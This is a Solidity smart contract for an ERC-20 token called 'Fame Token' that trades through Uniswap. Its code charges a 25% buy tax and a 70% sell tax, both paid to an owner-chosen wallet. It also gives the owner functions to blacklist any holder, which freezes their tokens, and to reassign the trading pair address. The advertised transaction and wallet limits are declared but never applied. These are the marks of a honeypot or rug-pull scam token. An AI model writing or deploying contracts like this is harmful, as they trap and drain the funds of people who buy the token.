// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract FameToken is Context, IERC20, Ownable {
    string private constant _name = "Fame Token";
    string private constant _symbol = "FAME";
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1000000000 * 10**_decimals;

    uint256 public buyTax = 25;   // 25% buy tax
    uint256 public sellTax = 70;  // 70% sell tax

    uint256 public maxTxAmount = (_totalSupply * 2) / 100;  // 2% of total supply
    uint256 public maxWalletSize = (_totalSupply * 2) / 100;  // 2% of total supply

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isLimitFree;
    mapping(address => bool) private _blacklist;

    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    address public taxWallet;

    bool private tradingOpen = false;

    constructor(address _taxWallet) {
        taxWallet = _taxWallet;
        _balances[msg.sender] = _totalSupply;
        _isLimitFree[msg.sender] = true;
        _isLimitFree[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint256).max);
        tradingOpen = true;
    }

    function setBlacklist(address wallet, bool value) external onlyOwner {
        _blacklist[wallet] = value;
    }

    function changeTax(uint256 _buyTax, uint256 _sellTax) external onlyOwner {
        require(_buyTax <= buyTax && _sellTax <= sellTax, "Tax can only be lowered");
        buyTax = _buyTax;
        sellTax = _sellTax;
    }
function setUniswapV2Pair(address _pair) external onlyOwner {
    uniswapV2Pair = _pair;
}

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!_blacklist[from], "Sender is blacklisted");

        uint256 taxAmount = 0;
        if (from == uniswapV2Pair) {
            // Buying
            taxAmount = (amount * buyTax) / 100;
        } else if (to == uniswapV2Pair) {
            // Selling
            taxAmount = (amount * sellTax) / 100;
        }

        uint256 transferAmount = amount - taxAmount;
        _balances[from] -= amount;
        _balances[to] += transferAmount;
        _balances[taxWallet] += taxAmount;

        emit Transfer(from, to, transferAmount);
        if (taxAmount > 0) {
            emit Transfer(from, taxWallet, taxAmount);
        }
    }

    receive() external payable {}
}